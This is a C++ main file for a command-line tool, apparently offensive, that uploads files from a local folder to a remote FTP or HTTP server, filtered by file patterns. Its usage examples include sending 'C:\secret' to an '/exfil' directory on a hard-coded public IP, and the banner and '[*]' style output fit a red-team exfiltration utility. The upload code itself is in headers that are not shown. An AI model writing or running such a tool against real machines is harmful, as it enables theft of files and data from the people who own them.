#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>         // For EXIT_*
#include "FtpUploader.h"   // Our FTP logic
#include "HttpUploader.h"  // Our HTTP logic
#include "Utils.h"         // Our helper utilities
//g++ -o ftp_uploader.exe main.cpp FtpUploader.cpp Utils.cpp HttpUploader.cpp -lwininet -lshlwapi
int main(int argc, char* argv[])
{
    // Print a banner akin to the original code
    std::cout << R"(
 _____     _ _ _____                 ___         
|  |  |___|_| |_   _|___ ___ ___ ___|  _|___ ___ 
|  |  | -_| | | | | |  _| .'|   |_ -|  _| -_|  _|
 \___/|___|_|_| |_| |_| |__,|_|_|___|_| |___|_|  
             v1.0 | FTP/HTTP | by :)
)" << "\n";

    // We expect:
    //   argv[1] = "ftp" or "http"
    //   argv[2] = username
    //   argv[3] = password
    //   argv[4] = server (for FTP or HTTP host)
    //   argv[5] = localPath
    //   argv[6] = remotePath (FTP directory or HTTP endpoint)
    //   argv[7] = [optional] comma-separated patterns

    if (argc < 7) {
        std::cout << "[!] Usage:\n"
                  << "    " << argv[0] << " <ftp|http> <username> <password> <server> <localPath> <remotePath> [patterns]\n\n"
                  << "Examples:\n"
                  << "    " << argv[0] << " ftp user pass 64.94.85.32 C:\\myfiles /upload *.exe,*.txt\n"
                  << "    " << argv[0] << " ftp user pass ftp.example.com C:\\secret /exfil\n"
                  << "    " << argv[0] << " http user pass 192.168.1.100 C:\\myfiles /upload *.pdf\n\n"
                  << "Notes:\n"
                  << " - If you omit [patterns], all files in <localPath> are uploaded.\n"
                  << " - Patterns are comma-separated (e.g. \"*.txt,*.pdf\").\n"
                  << " - For FTP, if your server is on port 21, simply supply the IP/host (e.g. 64.94.85.32).\n"
                  << " - For HTTP, we assume port 80 (unsecured). Provide the IP or domain.\n";
        return EXIT_FAILURE;
    }

    // Parse arguments
    std::string mode        = argv[1];   // "ftp" or "http"
    std::string username    = argv[2];
    std::string password    = argv[3];
    std::string server      = argv[4];   // e.g., "ftp.example.com" or "192.168.1.100"
    std::string localPath   = argv[5];   // e.g., "C:\\Users\\User\\files"
    std::string remotePath  = argv[6];   // e.g., "/upload" or "/endpoint"

    // Optional 7th param: comma-separated list of patterns (e.g. "*.xlsx,*.xls,*.docx")
    std::vector<std::string> includePatterns;
    if (argc >= 8) {
        includePatterns = splitString(argv[7], ',');
    }

    if (includePatterns.empty()) {
        std::cout << "[!] No file patterns provided; all files in localPath will be uploaded.\n";
    }

    // Perform the appropriate upload
    try {
        if (mode == "ftp") {
            std::cout << "[*] Using FTP mode.\n";
            uploadFTP(username, password, server, localPath, remotePath, includePatterns);
            std::cout << "\n[*] File(s) uploaded successfully via FTP.\n";
        }
        else if (mode == "http") {
            std::cout << "[*] Using HTTP mode.\n";
            uploadHTTP(username, password, server, localPath, remotePath, includePatterns);
            std::cout << "\n[*] File(s) uploaded successfully via HTTP.\n";
        }
        else {
            std::cerr << "[-] Unknown mode: " << mode << ". Must be 'ftp' or 'http'.\n";
            return EXIT_FAILURE;
        }
    } catch (const std::exception& ex) {
        std::cerr << "[-] Upload error: " << ex.what() << "\n";
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
